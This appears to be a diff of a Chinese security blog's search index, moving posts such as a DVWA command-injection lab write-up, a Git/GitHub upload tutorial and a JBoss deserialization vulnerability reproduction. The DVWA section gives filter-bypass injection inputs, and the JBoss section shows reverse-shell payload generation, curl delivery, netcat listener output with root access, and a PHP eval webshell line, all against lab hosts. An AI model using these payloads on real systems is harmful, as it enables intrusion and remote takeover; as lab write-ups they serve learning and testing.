-<p>由于使用的是<code>str_replace</code>把<code>”&amp;&amp;”</code>、<code>”;”</code>替换为空字符，因此可以采用以下方式绕过：</p>
-<p><code>61.135.169.125&amp;;&amp;ipconfig</code></p>
-<p>![](DVWA之Command Injection/CI5.jpg)</p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; trim($_REQUEST[ &#39;ip&#39; ]);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;| &#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，High级别的代码进行了黑名单过滤，把一些常见的命令连接符给过滤了。黑名单过滤看似安全，但是如果黑名单不全是话，是很容易进行绕过的。我们仔细看黑名单过滤中的<code>|</code>,<code>|</code>后面还有一个空格，所以我们可以进行绕过，输入下面命令。</p>
-<p><code>61.135.169.125|ipconfig</code></p>
-<p>![](DVWA之Command Injection/CI6.jpg)</p>
-<p><code>|</code>是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p>
-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; $_REQUEST[ &#39;ip&#39; ];</span><br><span class="line">    $target &#x3D; stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Split the IP into 4 octects</span><br><span class="line">    $octet &#x3D; explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) &#x3D;&#x3D; 4 ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; If all 4 octets are int&#39;s put the IP back together.</span><br><span class="line">        $target &#x3D; $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">            &#x2F;&#x2F; Windows</span><br><span class="line">            $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; *nix</span><br><span class="line">            $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>stripslashes(string)</code>: 该函数会删除字符串<code>string</code>中的反斜杠，返回已剥离反斜杠的字符串。</p>
-<p><code>explode(separator,string,limit)</code>: 该函数把字符串打散为数组，返回字符串的数组。参数<code>separator</code>规定在哪里分割字符串，参数<code>string</code>是要分割的字符串，可选参数<code>limit</code>规定所返回的数组元素的数目。</p>
-<p><code>is_numeric(string)</code>: 该检测<code>string</code>是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p>
-<p>可以看到，Impossible级别的代码加入了<code>Anti-CSRF token</code>，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>GitHub上传</title>
-    <url>/posts/8472.html</url>
-    <content><![CDATA[<h2 id="GitHub上传"><a href="#GitHub上传" class="headerlink" title="GitHub上传"></a>GitHub上传</h2><hr>
-<p>0x00.首先注册github账号，登录，创建新仓库 ，点击+，点击new repository   <img src="https://i.imgur.com/Q2p1noE.png" alt>    </p>
-<p>进入如下页面，填写仓库名，自己随便写一个名字，下面的描述可写可不写，点击Initialize this repository   with a README，然后创建：<a id="more"></a><br><img src="https://i.imgur.com/wNvnT5T.png" alt>   </p>
-<p>0x01.下载git<br><a href="https://gitforwindows.org/" target="_blank" rel="noopener">https://gitforwindows.org/</a> </p>
-<p>0x02.配置git<br>1.设置本地的ssh key，打开git bash,输入命令：<br>ssh-keygen -t rsa -C “<a href="mailto:XXXXXX@XXXX.com">XXXXXX@XXXX.com</a>“<br>其中双引号中是你注册github时用的邮箱。<br>一直回车，选择默认路径，和空密码。最后会在默认路径下生成.ssh文件夹，打开.ssh里面有两个文件，打开id_rsa.pub复制里面的密钥。</p>
-<p>2.打开github,选择settings<br><img src="https://i.imgur.com/jqqfV4E.png" alt><br>得到如下页面，点击ssh and gpg keys,选择ssh keys 右边的new ssh key。出现下面绿色框的内容，填写标题，并将自己刚才复制的密钥粘贴到key中。最后点击add ssh key.<br><img src="https://i.imgur.com/PWqO1em.png" alt><br>3.查看是否成功。</p>
-<p>在git bash中输入命令：ssh -T <a href="mailto:git@github.com">git@github.com</a><br>会提示，是否continue，输入yes。<br>后就会看到：</p>
-<p>Warning:Permanently added ‘github.com,207.97.227.239’ (RSA) to the list of known hosts.</p>
-<p>Hi zhangsiyao11! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
-<p>这样就成功了，不用理会warning。</p>
-<p>4.克隆你刚才新建的仓库到本地<br>输入命令：<br>git clone <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>后面的http是你的仓库的地址。<br>此时会在刚才创建ssh  key的默认目录下生成以你仓库名为文件名的文件，打开得到下图所示：<br><img src="https://i.imgur.com/0oHqKNs.png" alt></p>
-<p>6.在此处右键打开git bash,输入如下命令：<br>git init<br>git add “文件名”<br>git commit -m “文件名”<br>如果出现让你设置用户名和用户邮箱的提示，就按照提示上给的命令输入即可。后再次执行上面commit的命令。<br>git remote add origin <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>http为你自己仓库的地址<br>如果出现错误：<br>fatal: remote origin already exists<br>则执行以下语句：git remote rm origin<br>再执行git remote add origin <a href="https://github.com/zhangsiyao11/chat即可。" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat即可。</a><br>最后在依次执行：<br>git pull origin master<br>git push origin master<br>完成，再打开自己的仓库就会出现刚刚上传的项目文件:<br><img src="https://i.imgur.com/X0sb9Hw.png" alt></p>
-]]></content>
-      <categories>
-        <category>Github</category>
-      </categories>
-      <tags>
-        <tag>Github</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Git学习（一）</title>
     <url>/posts/55269.html</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Git是目前世界上最先进的分布式版本控制系统（没有之一）。</p>
@@ -713,8 +690,34 @@
 <p>不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。</p>
 <p>因为文本是有编码的，比如中文有常用的GBK编码，日文有Shift_JIS编码，如果没有历史遗留问题，强烈建议使用标准的UTF-8编码，所有语言使用同一种编码，既没有冲突，又被所有平台所支持。</p>
 ]]></content>
+      <categories>
+        <category>Github</category>
+      </categories>
       <tags>
         <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GitHub上传</title>
+    <url>/posts/8472.html</url>
+    <content><![CDATA[<h2 id="GitHub上传"><a href="#GitHub上传" class="headerlink" title="GitHub上传"></a>GitHub上传</h2><hr>
+<p>0x00.首先注册github账号，登录，创建新仓库 ，点击+，点击new repository   <img src="https://i.imgur.com/Q2p1noE.png" alt>    </p>
+<p>进入如下页面，填写仓库名，自己随便写一个名字，下面的描述可写可不写，点击Initialize this repository   with a README，然后创建：<a id="more"></a><br><img src="https://i.imgur.com/wNvnT5T.png" alt>   </p>
+<p>0x01.下载git<br><a href="https://gitforwindows.org/" target="_blank" rel="noopener">https://gitforwindows.org/</a> </p>
+<p>0x02.配置git<br>1.设置本地的ssh key，打开git bash,输入命令：<br>ssh-keygen -t rsa -C “<a href="mailto:XXXXXX@XXXX.com">XXXXXX@XXXX.com</a>“<br>其中双引号中是你注册github时用的邮箱。<br>一直回车，选择默认路径，和空密码。最后会在默认路径下生成.ssh文件夹，打开.ssh里面有两个文件，打开id_rsa.pub复制里面的密钥。</p>
+<p>2.打开github,选择settings<br><img src="https://i.imgur.com/jqqfV4E.png" alt><br>得到如下页面，点击ssh and gpg keys,选择ssh keys 右边的new ssh key。出现下面绿色框的内容，填写标题，并将自己刚才复制的密钥粘贴到key中。最后点击add ssh key.<br><img src="https://i.imgur.com/PWqO1em.png" alt><br>3.查看是否成功。</p>
+<p>在git bash中输入命令：ssh -T <a href="mailto:git@github.com">git@github.com</a><br>会提示，是否continue，输入yes。<br>后就会看到：</p>
+<p>Warning:Permanently added ‘github.com,207.97.227.239’ (RSA) to the list of known hosts.</p>
+<p>Hi zhangsiyao11! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
+<p>这样就成功了，不用理会warning。</p>
+<p>4.克隆你刚才新建的仓库到本地<br>输入命令：<br>git clone <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>后面的http是你的仓库的地址。<br>此时会在刚才创建ssh  key的默认目录下生成以你仓库名为文件名的文件，打开得到下图所示：<br><img src="https://i.imgur.com/0oHqKNs.png" alt></p>
+<p>6.在此处右键打开git bash,输入如下命令：<br>git init<br>git add “文件名”<br>git commit -m “文件名”<br>如果出现让你设置用户名和用户邮箱的提示，就按照提示上给的命令输入即可。后再次执行上面commit的命令。<br>git remote add origin <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>http为你自己仓库的地址<br>如果出现错误：<br>fatal: remote origin already exists<br>则执行以下语句：git remote rm origin<br>再执行git remote add origin <a href="https://github.com/zhangsiyao11/chat即可。" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat即可。</a><br>最后在依次执行：<br>git pull origin master<br>git push origin master<br>完成，再打开自己的仓库就会出现刚刚上传的项目文件:<br><img src="https://i.imgur.com/X0sb9Hw.png" alt></p>
+]]></content>
+      <categories>
+        <category>Github</category>
+      </categories>
+      <tags>
+        <tag>Github</tag>
       </tags>
   </entry>
   <entry>
@@ -915,68 +918,6 @@
       </tags>
   </entry>
   <entry>
-    <title>JBOSS漏洞复现</title>
-    <url>/posts/9957.html</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><h2 id="0x01-JBossMQ-JMS-反序列化漏洞-CVE-2017-7504"><a href="#0x01-JBossMQ-JMS-反序列化漏洞-CVE-2017-7504" class="headerlink" title="0x01 JBossMQ JMS 反序列化漏洞(CVE-2017-7504)"></a>0x01 JBossMQ JMS 反序列化漏洞(CVE-2017-7504)</h2><h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>目标： <code>http://192.168.220.151:8080</code></p>
-<p>利用工具： <a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">JavaDeserH2HC</a></p>
-<p>poc使用方法：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击机下载执行执行生成二进制payload文件：</span><br><span class="line"> </span><br><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">  </span><br><span class="line"> #修改接收shell的主机ip和端口</span><br><span class="line"> </span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8080 (IP:端口)</span><br><span class="line"> </span><br><span class="line">curl向被攻击服务器发送攻击payload：</span><br><span class="line">curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
-
-<p>我们选择一个Gadget： <code>ExampleCommonsCollections1WithHashMap</code></p>
-<p>编译并生成序列化数据：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure>
-<p>执行结果：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java</span><br><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br><span class="line">Saving serialized object in ExampleCommonsCollections1WithHashMap.ser</span><br></pre></td></tr></table></figure>
-<p>我们执行的命令是<code>touch /tmp/success</code>，执行完成后，将生成一个文件<code>ExampleCommonsCollections1WithHashMap.ser</code>，将该文件作为body发送如下数据包：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser</span><br></pre></td></tr></table></figure>
-<p>这个过程会产生一些警告，但好像不影响使用</p>
-<p>执行 <code>docker exec -ti 容器ID /bin/bash</code> 进入容器</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@0ec136da132e:&#x2F;opt&#x2F;jdk# cd &#x2F;tmp</span><br><span class="line">root@0ec136da132e:&#x2F;tmp# ls</span><br><span class="line">hsperfdata_root  success</span><br></pre></td></tr></table></figure>
-<p>可以利用重定向写入一句话木马:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&lt;?php @eval(_POST[&#39;test&#39;]); ?&gt; &gt; &#x2F;tmp&#x2F;test.php</span><br></pre></td></tr></table></figure>
-<p>执行结果：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@0ec136da132e:&#x2F;tmp# ls</span><br><span class="line">aa.php	hsperfdata_root  success</span><br><span class="line">root@0ec136da132e:&#x2F;tmp# cat aa.php </span><br><span class="line">&lt;?php @eval(_POST[test]); ?&gt;</span><br><span class="line">root@0ec136da132e:&#x2F;tmp#</span><br></pre></td></tr></table></figure>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
-<li><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a></li>
-</ol>
-<h2 id="0x02-JBoss-5-x-6-x-反序列化漏洞-CVE-2017-12149"><a href="#0x02-JBoss-5-x-6-x-反序列化漏洞-CVE-2017-12149" class="headerlink" title="0x02 JBoss 5.x/6.x 反序列化漏洞(CVE-2017-12149)"></a>0x02 JBoss 5.x/6.x 反序列化漏洞(CVE-2017-12149)</h2><h3 id="漏洞说明-1"><a href="#漏洞说明-1" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
-<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker up -d</span><br></pre></td></tr></table></figure>
-<p>初始化完成后访问<code>http://192.168.220.151:8080/</code>即可看到JBoss默认页面<br>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化</p>
-<p>下载poc： <a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
-<p>使用poc：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java </span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8888</span><br><span class="line">Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
-<p>在攻击机上开启端口监听：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br></pre></td></tr></table></figure>
-<p>向目标发送payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser </span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;JBoss Web&#x2F;3.0.0-CR2 - Error report&lt;&#x2F;title&gt;&lt;style&gt;&lt;!--H1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; H2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; H3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; BODY &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; B &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; P &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125;A &#123;color : black;&#125;A.name &#123;color : black;&#125;HR &#123;color : #525D76;&#125;--&gt;&lt;&#x2F;style&gt; &lt;&#x2F;head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 - &lt;&#x2F;h1&gt;&lt;HR size&#x3D;&quot;1&quot; noshade&#x3D;&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;&#x2F;b&gt; Exception report&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;message&lt;&#x2F;b&gt; &lt;u&gt;&lt;&#x2F;u&gt;&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;description&lt;&#x2F;b&gt; &lt;u&gt;The server encountered an internal error () that prevented it from fulfilling this request.&lt;&#x2F;u&gt;&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;exception&lt;&#x2F;b&gt; &lt;pre&gt;java.lang.ClassCastException: java.util.HashSet cannot be cast to org.jboss.invocation.MarshalledInvocation</span><br><span class="line">	org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)</span><br><span class="line">&lt;&#x2F;pre&gt;&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;note&lt;&#x2F;b&gt; &lt;u&gt;The full stack trace of the root cause is available in the JBoss Web&#x2F;3.0.0-CR2 logs.&lt;&#x2F;u&gt;&lt;&#x2F;p&gt;&lt;HR size&#x3D;&quot;1&quot; noshade&#x3D;&quot;noshade&quot;&gt;&lt;h3&gt;JBoss Web&#x2F;3.0.0-CR2&lt;&#x2F;h3&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC#</span><br></pre></td></tr></table></figure>
-<p>反弹shell成功！！！</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">192.168.220.151: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.220.133] from (UNKNOWN) [192.168.220.151] 53530</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
-<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul>
-<li><a href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg</a></li>
-<li><a href="https://access.redhat.com/security/cve/cve-2017-12149" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2017-12149</a></li>
-</ul>
-<h2 id="0x03-JMXInvokerServlet-反序列化漏洞"><a href="#0x03-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="0x03 JMXInvokerServlet 反序列化漏洞"></a>0x03 JMXInvokerServlet 反序列化漏洞</h2><h3 id="漏洞说明-2"><a href="#漏洞说明-2" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>这个漏洞与前两个差别不大，JBoss在处理<code>/invoker/JMXInvokerServlet</code>请求的时候读取了对象。</p>
-<p>所以，只要把url改成下面即可：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;JMXInvokerServlet</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java </span><br><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8888</span><br><span class="line">Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
-<p>在攻击机上开启端口监听：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br></pre></td></tr></table></figure>
-<p>向目标发送payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser </span><br><span class="line">Warning: Binary output can mess up your terminal. Use &quot;--output -&quot; to tell </span><br><span class="line">Warning: curl to output it to your terminal anyway, or consider &quot;--output </span><br><span class="line">Warning: &lt;FILE&gt;&quot; to save to a file.</span><br></pre></td></tr></table></figure>
-<p>有几个警告，不影响操作。</p>
-<p>反弹shell成功。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">192.168.220.151: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.220.133] from (UNKNOWN) [192.168.220.151] 41174</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux入门学习</title>
     <url>/posts/18536.html</url>
     <content><![CDATA[<h2 id="指令与选项"><a href="#指令与选项" class="headerlink" title="指令与选项"></a>指令与选项</h2><p>什么是Linux的指令？<br>指在Linux终端（命令行）中输入的内容就称之为指令 </p>
@@ -1068,6 +1009,68 @@
       </categories>
       <tags>
         <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JBOSS漏洞复现</title>
+    <url>/posts/9957.html</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><h2 id="0x01-JBossMQ-JMS-反序列化漏洞-CVE-2017-7504"><a href="#0x01-JBossMQ-JMS-反序列化漏洞-CVE-2017-7504" class="headerlink" title="0x01 JBossMQ JMS 反序列化漏洞(CVE-2017-7504)"></a>0x01 JBossMQ JMS 反序列化漏洞(CVE-2017-7504)</h2><h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>目标： <code>http://192.168.220.151:8080</code></p>
+<p>利用工具： <a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">JavaDeserH2HC</a></p>
+<p>poc使用方法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击机下载执行执行生成二进制payload文件：</span><br><span class="line"> </span><br><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">  </span><br><span class="line"> #修改接收shell的主机ip和端口</span><br><span class="line"> </span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8080 (IP:端口)</span><br><span class="line"> </span><br><span class="line">curl向被攻击服务器发送攻击payload：</span><br><span class="line">curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
+
+<p>我们选择一个Gadget： <code>ExampleCommonsCollections1WithHashMap</code></p>
